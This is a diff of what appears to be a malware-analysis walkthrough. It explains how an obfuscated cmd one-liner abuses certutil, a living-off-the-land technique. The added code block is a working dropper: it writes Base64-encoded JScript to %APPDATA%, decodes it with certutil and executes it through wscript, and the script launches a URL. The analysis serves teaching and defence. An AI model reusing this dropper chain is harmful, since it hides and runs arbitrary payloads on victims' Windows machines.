@@ -4,6 +4,10 @@
 
 2. Opening in a text editor, we notice a large block of ASCII characters as well as the Windows system command certutil, which supports that these characters are most likely encoded in Base64.
 
+```
+start /MIN cmd %ComSpec% /V/D/c "s^eT IITV=%APPDATA%\%RANDOM%.^j^S&&echo dmFyIENTYUo9IlciKyJzQyIrIlIiOw0KdmFyIERTYUo9ImlQIisidC4iOw0KdmFyIEVTYUo9IlNoIisiRWwiKyJsIjsNCnZhciBGU2FKPSJoIisiVCIrIlQiOw0KdmFyIEdTYUo9InAiKyJzOi8iKyIvIjsNCnZhciBzaGVsbCA9IG5ldyBBY3RpdmVYT2JqZWN0KENTYUorRFNhSitFU2FKKTsNCnNoZWxsLnJ1bihGU2FKICsgR1NhSiArICJhdHRhY2tuZGVmZW5kLmNvbSIpOw== >!IITV!&&cErtUtil -f -dEco^de !IITV! !IITV!&& w^s^c^r^ipt !IITV!"
+```
+
 While certutil is used to manage certificates, the tool can be abused by attackers in quite a few ways including downloading files, and also encoding and decoding files in Base64[^1]. This technique to use native system tools is referred to as Living off the Land. See reference section for more details.
 
 3. The initial cmd file utilises windows environment variables, as well as setting a new variable to an encoded Base64 file. I've added a few additional windows environment variables which were not included in the original sample such as the %RANDOM% environment variable when creating the file.
